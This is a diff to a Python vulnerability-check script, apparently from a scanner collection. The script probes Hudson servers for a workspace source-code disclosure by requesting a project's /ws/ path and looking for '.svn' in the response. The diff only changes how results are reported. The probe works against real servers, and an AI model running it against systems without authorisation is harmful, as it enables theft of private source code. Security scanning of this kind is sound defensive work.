@@ -7,9 +7,8 @@ author: Lucifer
 description: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。访问项目页面访问不到源代码,我们后面直接加入/ws/即可访问和下载所有代码。
 '''
 import sys
-import warnings
 import requests
-from termcolor import cprint
+
 
 class hudson_ws_disclosure_BaseVerify:
     def __init__(self, url):
@@ -24,12 +23,12 @@ class hudson_ws_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r".svn" in req.text:
-                cprint("[+]存在hudson源代码泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
-
+                return "[+]存在hudson源代码泄露漏洞...(中危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ======>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = hudson_ws_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
